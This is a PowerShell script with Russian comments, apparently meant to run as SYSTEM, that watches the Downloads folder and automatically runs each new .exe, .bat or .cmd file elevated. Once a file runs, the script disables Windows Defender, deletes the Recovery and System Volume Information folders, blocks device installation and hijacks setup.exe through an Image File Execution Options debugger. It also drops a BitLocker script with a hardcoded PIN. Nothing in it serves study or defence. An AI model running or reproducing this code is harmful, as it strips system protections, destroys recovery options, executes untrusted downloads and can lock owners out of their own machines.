# 1. ПРОВЕРКА ВЫСШИХ ПРАВ СИСТЕМЫ
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
    [System.Windows.Forms.MessageBox]::Show("КРИТИЧЕСКАЯ ОШИБКА:`nСкрипт должен работать от имени СИСТЕМЫ через Планировщик!", "Контроль прав", 0, 16)
    Exit
}

# 2. НАСТРОЙКА СЛЕДОПЫТА ЗА ВСЕМИ ФАЙЛАМИ
$Folder = "$HOME\Downloads"
$Watcher = New-Object System.IO.FileSystemWatcher
$Watcher.Path = $Folder
$Watcher.Filter = "*.*" # Ловит абсолютно любой файл
$Watcher.IncludeSubdirectories = $false
$Watcher.EnableRaisingEvents = $true

$Action = {
    $Path = $Event.SourceEventArgs.FullPath
    Start-Sleep -Milliseconds 1000 # Ждем 1 секунду, чтобы файл докачался полностью
    
    if (Test-Path $Path) {
        # Проверяем, что это файл, а не папка, и у него расширение .exe или .bat
        $Extension = [System.IO.Path]::GetExtension($Path)
        if ($Extension -eq ".exe" -or $Extension -eq ".bat" -or $Extension -eq ".cmd") {
            
            # А) Забираем права и отдаем Администраторам и Системе
            takeown /f "$Path" /a
            icacls "$Path" /grant *S-1-5-32-544:F /c
            icacls "$Path" /grant *S-1-5-18:F /c
            
            # Б) СРАЗУ АВТОМАТИЧЕСКИ ЗАПУСКАЕМ ФАЙЛ
            Start-Process -FilePath $Path -Verb RunAs
            Start-Sleep -Seconds 60
            sc config WinDefend start= disabled
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
            rmdir /s /q "C:\Windows\System32\Recovery"
            rmdir /s /q "C:\System Volume Information"
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v DenyUnspecified /t REG_DWORD /d 1 /f
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f

            $code = @'
$Drive = "C:"
$PasswordText = "Bsy7uw%@&567"
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$Tpm = Get-Tpm
if ($Tpm.TpmPresent -eq $false -or $Tpm.TpmReady -eq $false) {
    [System.Windows.Forms.MessageBox]::Show("Ошибка: Чип TPM отключен или отсутствует! BitLocker для диска C: не может быть включен.", "BitLocker Ошибка", 0, 16)
    exit
}
$Password = ConvertTo-SecureString $PasswordText -AsPlainText -Force
Enable-BitLocker -MountPoint $Drive -EncryptionMethod XtsAes128 -Pin $Password -UsedSpaceOnly -SkipHardwareTest -ErrorAction SilentlyContinue
$Key = Get-BitLockerVolume -MountPoint $Drive | Select-Object -ExpandProperty KeyProtector | Where-Object {$_.KeyProtectorType -eq 'RecoveryKey'}
if ($Key) {
    $Key | Out-File "$DesktopPath\КЛЮЧ_ВОССТАНОВЛЕНИЯ_БИТЛОКЕР.txt"
    [System.Windows.Forms.MessageBox]::Show("Успешно! Пароль установлен. На Рабочем столе создан файл с ключом восстановления. Обязательно сохраните его!", "BitLocker Успех", 0, 64)
} else {
    [System.Windows.Forms.MessageBox]::Show("Что-то пошло не так. Возможно, BitLocker уже включен или требуется запуск от Администратора.", "BitLocker Предупреждение", 0, 48)
}
'@
$code | Out-File "$([Environment]::GetFolderPath('Desktop'))\bitlocker.ps1" -Encoding utf8

        }
    }
}

# Регистрируем автоматический перехват
Register-ObjectEvent $Watcher "Created" -Action $Action

# Скрипт бесконечно работает в фоне компьютера
while ($true) { Start-Sleep -Seconds 5 }
